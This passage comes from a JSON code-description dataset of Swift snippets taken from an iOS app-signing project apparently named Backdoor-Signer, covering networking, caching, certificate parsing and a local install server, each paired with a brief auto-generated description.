    "nl": "Function appWillTerminate - implements appwillterminate functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift",
    "code_type": "function"
  },
  {
    "id": "328",
    "code": "@objc private func handleMemoryWarning() {\n// Clean up any completed or failed tasks that might still be in memory\ntaskQueue.async(flags: .barrier) { [weak self] in",
    "nl": "Function handleMemoryWarning - implements handlememorywarning functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift",
    "code_type": "function"
  },
  {
    "id": "329",
    "code": "private func clearAllTasks() {\ntaskQueue.async(flags: .barrier) { [weak self] in",
    "nl": "Function clearAllTasks - implements clearalltasks functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift",
    "code_type": "function"
  },
  {
    "id": "330",
    "code": "extension SourcesViewController {}\n",
    "nl": "extension SourcesViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/SourceDownload.swift",
    "code_type": "extension"
  },
  {
    "id": "331",
    "code": "struct iTunesLookupResult: Codable {\nlet resultCount: Int\nlet results: [iTunesResult]\n}\n\nstruct iTunesResult: Codable {",
    "nl": "struct iTunesLookupResult - implements functionality related to tunes lookup result",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/iTunesLookup.swift",
    "code_type": "struct"
  },
  {
    "id": "332",
    "code": "struct iTunesResult: Codable {\nlet bundleId: String\n\nenum CodingKeys: String, CodingKey {",
    "nl": "struct iTunesResult - implements functionality related to tunes result",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/iTunesLookup.swift",
    "code_type": "struct"
  },
  {
    "id": "333",
    "code": "enum CodingKeys: String, CodingKey {\ncase bundleId\n}\n}\n\nclass iTunesLookup {",
    "nl": "enum CodingKeys - implements functionality related to coding keys",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/iTunesLookup.swift",
    "code_type": "enum"
  },
  {
    "id": "334",
    "code": "class iTunesLookup {\nstatic func checkBundleId(_ bundleId: String) async throws -> Bool {",
    "nl": "class iTunesLookup - implements functionality related to tunes lookup",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/iTunesLookup.swift",
    "code_type": "class"
  },
  {
    "id": "335",
    "code": "static func checkBundleId(_ bundleId: String) async throws -> Bool {\nlet encodedBundleId = bundleId.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) ?? bundleId\nlet urlString = \"https://itunes.apple.com/lookup?bundleId=\\(encodedBundleId)\"\n\nguard let url = URL(string: urlString) else {",
    "nl": "Function checkBundleId - implements checkbundleid functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/iTunesLookup.swift",
    "code_type": "function"
  },
  {
    "id": "336",
    "code": "extension NetworkManager {\n/// Perform a network request without requiring Decodable conformance\n/// - Parameters:\n///   - request: The URL request to perform\n///   - caching: Whether to use caching (default is based on configuration)\n///   - completion: Completion handler with the result\n/// - Returns: A cancellable task identifier\n@discardableResult\nfunc performRequestWithoutDecoding(\n_ request: URLRequest,",
    "nl": "Extension to NetworkManager for batch requests that don't need Decodable conformance",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager+NonDecodable.swift",
    "code_type": "extension"
  },
  {
    "id": "337",
    "code": "func performRequestWithoutDecoding(\n_ request: URLRequest,\ncaching: Bool? = nil,\ncompletion: @escaping (Result<Any, Error>) -> Void\n) -> URLSessionTask? {",
    "nl": "Function performRequestWithoutDecoding - implements performrequestwithoutdecoding functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager+NonDecodable.swift",
    "code_type": "function"
  },
  {
    "id": "338",
    "code": "final class NetworkManager {\n// MARK: - Singleton\n\n/// Shared instance of the network manager\nstatic let shared = NetworkManager()\n\n// MARK: - Configuration\n\n/// Configuration for network requests\nstruct Configuration {",
    "nl": "/ A comprehensive networking system with caching, retries, and background processing",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift",
    "code_type": "class"
  },
  {
    "id": "339",
    "code": "struct Configuration {\n/// Default timeout interval for requests (seconds)\nvar timeoutInterval: TimeInterval = 30.0\n\n/// Maximum number of retry attempts\nvar maxRetryAttempts: Int = 3\n\n/// Base delay for exponential backoff (seconds)\nvar baseRetryDelay: TimeInterval = 1.0\n",
    "nl": "MARK: - Configuration / Configuration for network requests",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift",
    "code_type": "struct"
  },
  {
    "id": "340",
    "code": "@objc private func handleMemoryWarning() {\n// Clear memory cache on memory warning\nresponseCache.removeAllObjects()\nDebug.shared.log(message: \"Cleared network response cache due to memory warning\", type: .warning)\n}\n\n// MARK: - Public Interface\n\n/// Perform a network request\n/// - Parameters:",
    "nl": "Function handleMemoryWarning - implements handlememorywarning functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift",
    "code_type": "function"
  },
  {
    "id": "341",
    "code": "func performRequest<T: Decodable>(\n_ request: URLRequest,\ncaching: Bool? = nil,\ncompletion: @escaping (Result<T, Error>) -> Void\n) -> URLSessionTask? {",
    "nl": "Function performRequest - implements performrequest functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift",
    "code_type": "function"
  },
  {
    "id": "342",
    "code": "func cancelAllOperations() {\noperationQueueAccessQueue.sync {",
    "nl": "/ Cancel all active operations",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift",
    "code_type": "function"
  },
  {
    "id": "343",
    "code": "func cancelOperation(for request: URLRequest) {\noperationQueueAccessQueue.sync {",
    "nl": "/ Cancel a specific operation / - Parameter request: The request to cancel",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift",
    "code_type": "function"
  },
  {
    "id": "344",
    "code": "func clearCache() {\n// Clear memory cache\nresponseCache.removeAllObjects()\n\n// Clear disk cache\ncleanupQueue.async { [weak self] in",
    "nl": "/ Clear all caches (memory and disk)",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift",
    "code_type": "function"
  },
  {
    "id": "345",
    "code": "private func createNetworkTask<T: Decodable>(\nrequest: URLRequest,\nretryCount: Int,\nuseCache: Bool,\ncompletion: @escaping (Result<T, Error>) -> Void\n) -> URLSessionTask {",
    "nl": "MARK: - Private Methods / Create a network task with retry logic / - Parameters: /   - request: The URL request /   - retryCount: Current retry count /   - useCache: Whether to cache the response /   - completion: Completion handler with the result / - Returns: The URLSessionTask",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift",
    "code_type": "function"
  },
  {
    "id": "346",
    "code": "func cacheResponse(data: Data, for request: URLRequest) {\nguard let url = request.url else { return }",
    "nl": "MARK: - Caching / Cache a response / - Parameters: /   - data: The response data /   - request: The URL request",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift",
    "code_type": "function"
  },
  {
    "id": "347",
    "code": "private func getCachedResponse(for request: URLRequest) -> CachedResponse? {\nguard let url = request.url else { return nil }",
    "nl": "/ Get a cached response / - Parameter request: The URL request / - Returns: The cached response, if available and not expired",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift",
    "code_type": "function"
  },
  {
    "id": "348",
    "code": "func isCacheExpired(_ cachedResponse: CachedResponse) -> Bool {\nlet now = Date()\nlet expirationTime = cachedResponse.timestamp.addingTimeInterval(_configuration.cacheLifetime)\nreturn now > expirationTime\n}\n\n/// Get the file URL for caching a response\n/// - Parameter url: The URL of the request\n/// - Returns: The file URL for caching\nprivate func cacheFileURL(for url: URL) -> URL {",
    "nl": "/ Check if a cached response is expired / - Parameter cachedResponse: The cached response / - Returns: True if the cache is expired",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift",
    "code_type": "function"
  },
  {
    "id": "349",
    "code": "private func cacheFileURL(for url: URL) -> URL {\n// Use URL's absoluteString hashed as the filename\nlet urlString = url.absoluteString\nlet filename = urlString.hash.magnitude.description\nreturn cacheDirectory.appendingPathComponent(filename)\n}\n\n/// Clean expired caches\nprivate func cleanExpiredCaches() {",
    "nl": "/ Get the file URL for caching a response / - Parameter url: The URL of the request / - Returns: The file URL for caching",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift",
    "code_type": "function"
  },
  {
    "id": "350",
    "code": "private func cleanExpiredCaches() {\ncleanupQueue.async { [weak self] in",
    "nl": "/ Clean expired caches",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift",
    "code_type": "function"
  },
  {
    "id": "351",
    "code": "enum NetworkError: Error, LocalizedError {\ncase invalidURL\ncase invalidResponse\ncase httpError(statusCode: Int)\ncase noData\ncase decodingError(Error)\ncase cancelled\n\nvar errorDescription: String? {",
    "nl": "MARK: - NetworkError / Errors that can occur during network operations",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift",
    "code_type": "enum"
  },
  {
    "id": "352",
    "code": "final class CachedResponse: NSObject, NSSecureCoding {\nstatic var supportsSecureCoding: Bool = true\n\n/// The response data\nlet data: Data\n\n/// When the response was cached\nlet timestamp: Date\n\n/// Initialize with data and timestamp",
    "nl": "MARK: - CachedResponse / A cached network response",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift",
    "code_type": "class"
  },
  {
    "id": "353",
    "code": "func encode(with coder: NSCoder) {\ncoder.encode(data, forKey: \"data\")\ncoder.encode(timestamp, forKey: \"timestamp\")\n}\n\n/// Initialize with coder\n/// - Parameter coder: The coder\nrequired init?(coder: NSCoder) {",
    "nl": "MARK: - NSSecureCoding / Encode with coder / - Parameter coder: The coder",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift",
    "code_type": "function"
  },
  {
    "id": "354",
    "code": "extension URLRequest {\n/// Create a request with optional caching and timeout configuration\n/// - Parameters:\n///   - url: The URL for the request\n///   - httpMethod: HTTP method (default is GET)\n///   - timeoutInterval: Timeout interval (default is from NetworkManager.Configuration)\n/// - Returns: The configured URL request\nstatic func build(\nurl: URL,\nhttpMethod: String = \"GET\",",
    "nl": "MARK: - URLRequest Extension",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift",
    "code_type": "extension"
  },
  {
    "id": "355",
    "code": "static func build(\nurl: URL,\nhttpMethod: String = \"GET\",\ntimeoutInterval: TimeInterval = NetworkManager.shared.configuration.timeoutInterval\n) -> URLRequest {",
    "nl": "/ Create a request with optional caching and timeout configuration / - Parameters: /   - url: The URL for the request /   - httpMethod: HTTP method (default is GET) /   - timeoutInterval: Timeout interval (default is from NetworkManager.Configuration) / - Returns: The configured URL request",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift",
    "code_type": "function"
  },
  {
    "id": "356",
    "code": "final class BatchRequest {\n// MARK: - Properties\n\n/// Requests in the batch\nprivate var requests: [URLRequest] = []\n\n/// Completion handler for the batch\nprivate var completion: (([Any], [Error]) -> Void)?\n\n/// Results of completed requests",
    "nl": "MARK: - NetworkManager Configuration Extension We access configuration directly from the instance property No extension needed here MARK: - Batch Request / A batch of network requests that can be executed together",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift",
    "code_type": "class"
  },
  {
    "id": "357",
    "code": "func add(_ request: URLRequest) -> Self {\nlock.lock()\nrequests.append(request)\nlock.unlock()\nreturn self\n}\n\n/// Execute all requests in the batch\n/// - Parameter completion: Completion handler with results and errors\nfunc execute(completion: @escaping ([Any], [Error]) -> Void) {",
    "nl": "Function add - implements add functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift",
    "code_type": "function"
  },
  {
    "id": "358",
    "code": "func execute(completion: @escaping ([Any], [Error]) -> Void) {\nself.completion = completion\n\nlock.lock()\nlet requestsCopy = requests\nlock.unlock()\n\n// Initialize results and errors arrays\nresults = Array(repeating: NSNull(), count: requestsCopy.count)\nerrors = Array(repeating: NetworkError.invalidResponse, count: requestsCopy.count)",
    "nl": "/ Execute all requests in the batch / - Parameter completion: Completion handler with results and errors",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift",
    "code_type": "function"
  },
  {
    "id": "359",
    "code": "func cancel() {\nlock.lock()\nlet requestsCopy = requests\nlock.unlock()\n\nfor request in requestsCopy {",
    "nl": "/ Cancel all requests in the batch",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift",
    "code_type": "function"
  },
  {
    "id": "360",
    "code": "class BundleIdChecker {\nstatic func shouldModifyBundleId(originalBundleId: String) async -> Bool {",
    "nl": "class BundleIdChecker - implements functionality related to bundle id checker",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/BundleIdChecker.swift",
    "code_type": "class"
  },
  {
    "id": "361",
    "code": "static func shouldModifyBundleId(originalBundleId: String) async -> Bool {\ndo {",
    "nl": "Function shouldModifyBundleId - implements shouldmodifybundleid functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/BundleIdChecker.swift",
    "code_type": "function"
  },
  {
    "id": "362",
    "code": "enum CertData {\nstatic func parseMobileProvisioningFile(atPath path: URL) -> Cert? {",
    "nl": "enum CertData - implements functionality related to cert data",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/CertData.swift",
    "code_type": "enum"
  },
  {
    "id": "363",
    "code": "static func parseMobileProvisioningFile(atPath path: URL) -> Cert? {\ndo {",
    "nl": "Function parseMobileProvisioningFile - implements parsemobileprovisioningfile functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/CertData.swift",
    "code_type": "function"
  },
  {
    "id": "364",
    "code": "static func copyFile(from sourceURL: URL?, to destinationDirectory: URL) throws {\nguard let sourceURL = sourceURL else { return }",
    "nl": "Function copyFile - implements copyfile functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/CertData.swift",
    "code_type": "function"
  },
  {
    "id": "365",
    "code": "final class ImageCache {\n// MARK: - Singleton\n\n/// Shared instance of the image cache\nstatic let shared = ImageCache()\n\n/// Save an image to the cache for a specific URL\n/// - Parameters:\n///   - image: The image to save\n///   - url: The URL associated with the image",
    "nl": "/ A comprehensive image caching system that handles both memory and disk caching",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift",
    "code_type": "class"
  },
  {
    "id": "366",
    "code": "func saveImage(_ image: UIImage, for url: URL) {\n// Save to memory cache\nlet key = url.absoluteString as NSString\nmemoryCache.setObject(image, forKey: key)\n\n// Save to disk in the background\ndiskQueue.async { [weak self] in",
    "nl": "/ Save an image to the cache for a specific URL / - Parameters: /   - image: The image to save /   - url: The URL associated with the image",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift",
    "code_type": "function"
  },
  {
    "id": "367",
    "code": "func loadImage(from url: URL?,\nplaceholder: UIImage? = nil,\ndownsampling: Bool = true,\ntargetSize: CGSize = CGSize(width: 80, height: 80),\ncompletion: @escaping (UIImage?) -> Void)\n{",
    "nl": "MARK: - Public Interface / Load an image from the given URL, with caching / - Parameters: /   - url: The URL to load the image from /   - placeholder: Optional placeholder image to use while loading /   - downsampling: Whether to downsample the image to target size /   - targetSize: Target size for downsampling (if enabled) /   - completion: Completion handler with the loaded image",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift",
    "code_type": "function"
  },
  {
    "id": "368",
    "code": "func cancelLoading(for url: URL) {\noperationQueue.async(flags: .barrier) { [weak self] in",
    "nl": "/ Cancel the loading of an image from the given URL / - Parameter url: The URL to cancel loading for",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift",
    "code_type": "function"
  },
  {
    "id": "369",
    "code": "func clearCache() {\n// Clear memory cache\nmemoryCache.removeAllObjects()\n\n// Clear failed URLs cache\nfailedURLsQueue.async {",
    "nl": "/ Clear all caches (memory and disk)",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift",
    "code_type": "function"
  },
  {
    "id": "370",
    "code": "private func downloadImage(from url: URL,\ndownsampling: Bool,\ntargetSize: CGSize,\ncompletion: @escaping (UIImage?) -> Void)\n{",
    "nl": "MARK: - Private Methods / Download image from URL / - Parameters: /   - url: The URL to download from /   - downsampling: Whether to downsample the image /   - targetSize: Target size for downsampling /   - completion: Completion handler with the downloaded image",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift",
    "code_type": "function"
  },
  {
    "id": "371",
    "code": "private func loadImageFromDisk(url: URL) -> UIImage? {\nlet fileURL = cacheFileURL(for: url)\n\nif fileManager.fileExists(atPath: fileURL.path) {",
    "nl": "/ Load image from disk cache / - Parameter url: The URL of the image / - Returns: The cached image, if available",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift",
    "code_type": "function"
  },
  {
    "id": "372",
    "code": "private func saveImageToDisk(image: UIImage, url: URL) {\ndiskQueue.async { [weak self] in",
    "nl": "/ Save image to disk cache / - Parameters: /   - image: The image to save /   - url: The URL of the image",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift",
    "code_type": "function"
  },
  {
    "id": "373",
    "code": "private func cacheFileURL(for url: URL) -> URL {\n// Use URL's absoluteString hashed as the filename\nlet urlString = url.absoluteString\nlet filename = urlString.hash.magnitude.description\nreturn cacheDirectory.appendingPathComponent(filename)\n}\n\n/// Downsample an image to reduce memory usage\n/// - Parameters:\n///   - image: The image to downsample",
    "nl": "/ Get the file URL for caching an image / - Parameter url: The source URL of the image / - Returns: The file URL for caching",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift",
    "code_type": "function"
  },
  {
    "id": "374",
    "code": "private func downsample(image: UIImage, to targetSize: CGSize) -> UIImage? {\nlet imageSourceOptions = [kCGImageSourceShouldCache: false] as CFDictionary\n\nguard let data = image.jpegData(compressionQuality: 1.0) else { return nil }",
    "nl": "/ Downsample an image to reduce memory usage / - Parameters: /   - image: The image to downsample /   - targetSize: The target size for downsampling / - Returns: The downsampled image",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift",
    "code_type": "function"
  },
  {
    "id": "375",
    "code": "@objc private func handleMemoryWarning() {\n// Clear memory cache on memory warning\nmemoryCache.removeAllObjects()\nDebug.shared.log(message: \"Cleared image memory cache due to memory warning\", type: .warning)\n}\n\n/// Handle app entering background\n@objc private func handleAppDidEnterBackground() {",
    "nl": "/ Handle memory warning notification",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift",
    "code_type": "function"
  },
  {
    "id": "376",
    "code": "@objc private func handleAppDidEnterBackground() {\n// Perform cleanup when app enters background\nperformCleanup()\n}\n\n/// Perform cleanup of disk cache\nprivate func performCleanup() {",
    "nl": "/ Handle app entering background",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift",
    "code_type": "function"
  },
  {
    "id": "377",
    "code": "private func performCleanup() {\ndiskQueue.async { [weak self] in",
    "nl": "/ Perform cleanup of disk cache",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift",
    "code_type": "function"
  },
  {
    "id": "378",
    "code": "extension UIImageView {\n/// Load an image from a URL with caching\n/// - Parameters:\n///   - url: The URL to load the image from\n///   - placeholder: Optional placeholder image to use while loading\nfunc loadImage(from url: URL?, placeholder: UIImage? = nil) {",
    "nl": "MARK: - UIImageView Extension",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift",
    "code_type": "extension"
  },
  {
    "id": "379",
    "code": "func loadImage(from url: URL?, placeholder: UIImage? = nil) {\n// Cancel any previous loads\nif let url = url {",
    "nl": "/ Load an image from a URL with caching / - Parameters: /   - url: The URL to load the image from /   - placeholder: Optional placeholder image to use while loading",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift",
    "code_type": "function"
  },
  {
    "id": "380",
    "code": "func getCertificates(completion: (() -> Void)? = nil) {\nlet sourceGET = SourceGET()\nguard let uri = URL(string: \"https://backloop.dev/pack.json\") else {",
    "nl": "Function getCertificates - retrieves certificates",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/DownloadCertificate.swift",
    "code_type": "function"
  },
  {
    "id": "381",
    "code": "func writeToFile(content: String, filename: String) throws {\nlet path = getDocumentsDirectory().appendingPathComponent(filename)\ntry content.write(to: path, atomically: true, encoding: .utf8)\n}\n\n// Create default empty files to prevent crashes if download fails\nfunc createDefaultFiles() {",
    "nl": "Function writeToFile - implements writetofile functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/DownloadCertificate.swift",
    "code_type": "function"
  },
  {
    "id": "382",
    "code": "func createDefaultFiles() {\ndo {",
    "nl": "Create default empty files to prevent crashes if download fails",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/DownloadCertificate.swift",
    "code_type": "function"
  },
  {
    "id": "383",
    "code": "func getDocumentsDirectory() -> URL {\nlet paths = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)\nreturn paths[0]\n}\n",
    "nl": "Function getDocumentsDirectory - retrieves documentsdirectory",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/DownloadCertificate.swift",
    "code_type": "function"
  },
  {
    "id": "384",
    "code": "extension Installer {\nvar pongEndpoint: URL {",
    "nl": "extension Installer - implements functionality related to installer",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server+Compute.swift",
    "code_type": "extension"
  },
  {
    "id": "385",
    "code": "func createWhite(_ r: CGFloat) -> Data {\nlet renderer = UIGraphicsImageRenderer(size: .init(width: r, height: r))\nlet image = renderer.image { ctx in",
    "nl": "Function createWhite - creates white",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server+Compute.swift",
    "code_type": "function"
  },
  {
    "id": "386",
    "code": "func getLocalIPAddress() -> String? {\nvar address: String?\nvar ifaddr: UnsafeMutablePointer<ifaddrs>?\n\nif getifaddrs(&ifaddr) == 0 {",
    "nl": "Function getLocalIPAddress - retrieves localipaddress",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server+TLS.swift",
    "code_type": "function"
  },
  {
    "id": "387",
    "code": "extension Installer {\nstatic let commonName = getDocumentsDirectory().appendingPathComponent(\"commonName.txt\")\n\nstatic let sni: String = {",
    "nl": "extension Installer - implements functionality related to installer",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server+TLS.swift",
    "code_type": "extension"
  },
  {
    "id": "388",
    "code": "static func setupTLS() throws -> TLSConfiguration {\nlet keyURL = documentsKeyURL\nlet crtURL = documentsCrtURL\n\nreturn try TLSConfiguration.makeServerConfiguration(\ncertificateChain: NIOSSLCertificate\n.fromPEMFile(crtURL.path)\n.map { NIOSSLCertificateSource.certificate($0) },",
    "nl": "Function setupTLS - sets uptls",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server+TLS.swift",
    "code_type": "function"
  },
  {
    "id": "389",
    "code": "extension Installer {\nstatic func readCommonName() -> String? {",
    "nl": "extension Installer - implements functionality related to installer",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server+TLS.swift",
    "code_type": "extension"
  },
  {
    "id": "390",
    "code": "static func readCommonName() -> String? {\ndo {",
    "nl": "Function readCommonName - implements readcommonname functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server+TLS.swift",
    "code_type": "function"
  },
  {
    "id": "391",
    "code": "struct AppData {\nvar id: String\nvar version: Int\nvar name: String\n}\n\nclass Installer: Identifiable, ObservableObject {",
    "nl": "struct AppData - implements functionality related to app data",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server.swift",
    "code_type": "struct"
  },
  {
    "id": "392",
    "code": "class Installer: Identifiable, ObservableObject {\nlet id: UUID\nlet app: Application\nvar package: URL\nlet port = Int.random(in: 4000 ... 8000)\nlet metadata: AppData\n\nenum Status {",
    "nl": "class Installer - implements functionality related to installer",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server.swift",
    "code_type": "class"
  },
  {
    "id": "393",
    "code": "enum Status {\ncase ready\ncase sendingManifest\ncase sendingPayload\ncase completed(Result<Void, Error>)\ncase broken(Error)\n}\n\n@Published var status: Status = .ready\n",
    "nl": "enum Status - implements functionality related to status",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server.swift",
    "code_type": "enum"
  },
  {
    "id": "394",
    "code": "private func configureRoutes() {\napp.get(\"*\") { [weak self] req in",
    "nl": "Configure app routes",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server.swift",
    "code_type": "function"
  },
  {
    "id": "395",
    "code": "private func handleRequest(_ req: Request) -> Response {\nswitch req.url.path {",
    "nl": "Handle request based on path",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server.swift",
    "code_type": "function"
  },
  {
    "id": "396",
    "code": "private func generateInstallResponse() -> Response {\nlet baseUrl = Preferences.onlinePath ?? Preferences.defaultInstallPath\nlet urlParams = [\n\"bundleid=\\(metadata.id)\",\n\"name=\\(metadata.name)\",\n\"version=\\(metadata.version)\",\n\"fetchurl=\\(payloadEndpoint.absoluteString)\",\n].joined(separator: \"&\")\n\nlet encodedParams = urlParams.addingPercentEncoding(withAllowedCharacters: .alphanumerics) ?? \"\"",
    "nl": "Generate install response for the \"i\" endpoint",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server.swift",
    "code_type": "function"
  },
  {
    "id": "397",
    "code": "func shutdownServer() {\nDebug.shared.log(message: \"Server is shutting down!\")\nif needsShutdown {",
